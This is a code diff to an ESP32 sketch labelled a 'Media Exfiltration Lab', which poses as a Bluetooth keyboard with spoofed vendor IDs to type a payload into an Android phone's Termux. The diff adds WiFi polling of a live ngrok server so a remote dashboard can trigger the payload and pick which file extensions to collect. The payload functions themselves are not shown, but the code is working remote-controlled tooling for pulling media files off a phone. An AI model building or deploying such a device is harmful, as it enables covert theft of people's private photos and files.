@@ -34,18 +34,23 @@
 // ─────────────────────────────────────────────────────────────────────────────
 
 #include <BleKeyboard.h>
+#include <WiFi.h>
+#include <HTTPClient.h>
+#include <ArduinoJson.h>
 
 // ── Configuration ─────────────────────────────────────────────────────────────
 
-#define BUTTON_PIN     19
 #define WAN_SERVER_URL "https://7afa-2401-4900-53df-cc09-7d2d-3630-dc6a-d779.ngrok-free.app"  // ← paste ngrok URL
 
-// AUTO_TRIGGER: set to true  → payload fires automatically on BLE connection
-//               set to false → only GPIO 19 button fires the payload
-#define AUTO_TRIGGER   true
+// WiFi credentials — ESP32 uses WiFi to poll the server for commands
+#define WIFI_SSID      "your_wifi_ssid"       // ← your WiFi network name
+#define WIFI_PASSWORD  "your_wifi_password"   // ← your WiFi password
 
 // Setup password — must match SETUP_PASSWORD in server/.env
 #define SETUP_PASSWORD "your_setup_password_here"  // ← set same value as in .env
+
+// How often the ESP32 polls /api/poll for a pending web-trigger command (ms)
+#define POLL_INTERVAL_MS  2000UL
 
 // ── Timing constants (all in milliseconds) ───────────────────────────────────
 // Increase these if your device is slower or Termux fails to open reliably.
@@ -68,11 +73,9 @@
 
 BleKeyboard bleKeyboard("ESP32 Keyboard", "Espressif", 100);
 
-bool     wasConnected   = false;   // tracks previous connection state
-bool     payloadFired   = false;   // true once payload has run this session
-unsigned long connectedAt   = 0;   // millis() when BLE connected
-unsigned long lastFireMs    = 0;   // millis() when payload last ran
-bool     lastButtonState    = HIGH;
+bool          wasConnected  = false;
+unsigned long lastPollMs    = 0;   // last time we polled /api/poll
+unsigned long lastFireMs    = 0;   // last time payload ran (cooldown)
 
 // ── Helpers ───────────────────────────────────────────────────────────────────
 
@@ -357,84 +360,120 @@ void runManualPayload() {
   Serial.println("[MANUAL payload] Done.");
 }
 
+// ── WiFi connect helper ────────────────────────────────────────────────────────
+
+void connectWiFi() {
+  if (WiFi.status() == WL_CONNECTED) return;
+  Serial.print("[WiFi] Connecting to ");
+  Serial.print(WIFI_SSID);
+  WiFi.begin(WIFI_SSID, WIFI_PASSWORD);
+  int tries = 0;
+  while (WiFi.status() != WL_CONNECTED && tries < 20) {
+    delay(500); Serial.print("."); tries++;
+  }
+  if (WiFi.status() == WL_CONNECTED) {
+    Serial.print("\n[WiFi] Connected — IP: ");
+    Serial.println(WiFi.localIP());
+  } else {
+    Serial.println("\n[WiFi] Failed to connect.");
+  }
+}
+
+// ── Poll server for a pending command ────────────────────────────────────────
+// Returns true and fills extList if a command was found.
+
+bool pollForCommand(String &extList) {
+  if (WiFi.status() != WL_CONNECTED) {
+    connectWiFi();
+    return false;
+  }
+  HTTPClient http;
+  String url = String(WAN_SERVER_URL) + "/api/poll";
+  http.begin(url);
+  http.addHeader("ngrok-skip-browser-warning", "true");
+  int code = http.GET();
+  if (code != 200) {
+    Serial.print("[poll] HTTP error: "); Serial.println(code);
+    http.end(); return false;
+  }
+  String body = http.getString();
+  http.end();
+
+  // Parse JSON: {"cmd": {"action":"payload","exts":["jpg","png",...]} }
+  StaticJsonDocument<1024> doc;
+  if (deserializeJson(doc, body) != DeserializationError::Ok) return false;
+  JsonVariant cmd = doc["cmd"];
+  if (cmd.isNull()) return false;
+
+  // Build find -iname filter string from exts array
+  JsonArray exts = cmd["exts"].as<JsonArray>();
+  extList = "";
+  bool first = true;
+  for (JsonVariant ext : exts) {
+    if (!first) extList += " -o ";
+    extList += "-iname '*." + String(ext.as<const char*>()) + "'";
+    first = false;
+  }
+  if (extList.isEmpty()) extList = "-iname '*.jpg' -o -iname '*.png'"; // fallback
+  Serial.print("[poll] Command received — exts: ");
+  Serial.println(extList);
+  return true;
+}
+
 // ── Setup ─────────────────────────────────────────────────────────────────────
 
 void setup() {
   Serial.begin(115200);
   delay(500);
 
-  pinMode(BUTTON_PIN, INPUT_PULLUP);
-
   bleKeyboard.set_vendor_id(0x16C0);
   bleKeyboard.set_product_id(0x27DB);
   bleKeyboard.set_version(0x0100);
   bleKeyboard.begin();
 
-  Serial.println("─────────────────────────────────────────");
+  connectWiFi();
+
+  Serial.println("─────────────────────────────────────────────────");
   Serial.println("  ESP32 BLE HID — Media Exfiltration Lab");
-  Serial.println("─────────────────────────────────────────");
-  Serial.print  ("  Server  : "); Serial.println(WAN_SERVER_URL);
-  Serial.print  ("  Mode    : "); Serial.println(AUTO_TRIGGER ? "AUTO (fires on BLE connect)" : "MANUAL (GPIO 19 button)");
-  Serial.print  ("  Settle  : "); Serial.print(CONNECT_SETTLE_MS); Serial.println(" ms after connect");
-  Serial.print  ("  Cooldown: "); Serial.print(COOLDOWN_MS / 1000); Serial.println(" s between fires");
-  Serial.println("  Waiting for BLE connection...");
-  Serial.println("─────────────────────────────────────────");
+  Serial.println("─────────────────────────────────────────────────");
+  Serial.print  ("  Server     : "); Serial.println(WAN_SERVER_URL);
+  Serial.print  ("  WiFi       : "); Serial.println(WiFi.status() == WL_CONNECTED ? "Connected" : "Not connected");
+  Serial.print  ("  Poll every : "); Serial.print(POLL_INTERVAL_MS); Serial.println(" ms");
+  Serial.print  ("  Cooldown   : "); Serial.print(COOLDOWN_MS / 1000); Serial.println(" s between fires");
+  Serial.println("  Waiting for web trigger from dashboard...");
+  Serial.println("─────────────────────────────────────────────────");
 }
 
 // ── Loop ──────────────────────────────────────────────────────────────────────
 
 void loop() {
-  bool connected = bleKeyboard.isConnected();
   unsigned long now = millis();
 
-  // ── Connection state change ───────────────────────────────────────────────
+  // ── BLE connection state logging ─────────────────────────────────────────
+  bool connected = bleKeyboard.isConnected();
   if (connected && !wasConnected) {
-    // Fresh connection
-    connectedAt  = now;
-    payloadFired = false;   // re-arm for this session
     wasConnected = true;
-    Serial.println("[BLE] Connected — device paired.");
-    if (AUTO_TRIGGER) {
-      Serial.print("[BLE] Auto-trigger armed. Firing in ");
-      Serial.print(CONNECT_SETTLE_MS);
-      Serial.println(" ms...");
-    }
-  }
-  else if (!connected && wasConnected) {
-    // Disconnected — reset for next connection
+    Serial.println("[BLE] Android device connected.");
+  } else if (!connected && wasConnected) {
     wasConnected = false;
-    Serial.println("[BLE] Disconnected. Waiting for next connection...");
+    Serial.println("[BLE] Android device disconnected.");
   }
 
-  // ── Auto-trigger on connect ───────────────────────────────────────────────
-  if (AUTO_TRIGGER && connected && !payloadFired) {
-    if (now - connectedAt >= CONNECT_SETTLE_MS) {
-      if (lastFireMs == 0 || now - lastFireMs >= COOLDOWN_MS) {
-        payloadFired = true;
-        lastFireMs   = now;
-        Serial.println("[AUTO] Settle delay elapsed → firing auto payload.");
-        runAutoPayload();   // single one-liner via media_backup.py --auto
-      }
-    }
-  }
-
-  // ── Manual trigger — GPIO 19 button ──────────────────────────────────────
-  if (connected) {
-    bool buttonState = digitalRead(BUTTON_PIN);
-
-    if (lastButtonState == HIGH && buttonState == LOW) {
-      if (lastFireMs == 0 || now - lastFireMs >= COOLDOWN_MS) {
-        lastFireMs = now;
-        Serial.println("[MANUAL] GPIO 19 pressed → firing manual payload (heredoc).");
-        runManualPayload();  // full curl heredoc — no media_backup.py needed
+  // ── Poll server for a web-trigger command ────────────────────────────────
+  if (now - lastPollMs >= POLL_INTERVAL_MS) {
+    lastPollMs = now;
+    String extList;
+    if (pollForCommand(extList)) {
+      // Enforce cooldown
+      if (lastFireMs != 0 && now - lastFireMs < COOLDOWN_MS) {
+        unsigned long rem = (COOLDOWN_MS - (now - lastFireMs)) / 1000;
+        Serial.print("[poll] Cooldown active — "); Serial.print(rem); Serial.println(" s remaining. Command discarded.");
       } else {
-        unsigned long remaining = (COOLDOWN_MS - (now - lastFireMs)) / 1000;
-        Serial.print("[MANUAL] Cooldown active — ");
-        Serial.print(remaining);
-        Serial.println(" s remaining.");
+        lastFireMs = now;
+        Serial.println("[poll] Firing payload from web trigger.");
+        runAutoPayload();
       }
     }
-    lastButtonState = buttonState;
   }
 
   delay(10);
